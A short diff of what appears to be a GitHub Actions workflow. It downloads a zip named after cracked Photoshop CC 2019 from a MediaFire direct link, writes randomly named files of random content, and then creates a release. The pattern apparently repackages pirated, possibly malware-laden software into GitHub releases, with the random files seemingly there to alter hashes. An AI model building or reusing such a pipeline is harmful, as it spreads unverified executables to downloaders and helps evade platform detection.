@@ -12,8 +12,7 @@ jobs:
     - name: get number
       id: getnumber
       run: |
-        wget https://www.mediafire.com/file/mggxqegzngve9kf/Photoshop_CC_2019_renaltutorial.zip/file
-        zip -r pkg.zip *.exe
+        wget https://download2390.mediafire.com/58qaar4jm3kg/mggxqegzngve9kf/Photoshop+CC+2019_renaltutorial.zip
         echo "$(openssl rand -hex 4)" > "random-name-$(openssl rand -hex 4).txt"
         echo "$(openssl rand -hex 4)" > "random-name-$(openssl rand -hex 4).txt"
     - name: Create Release
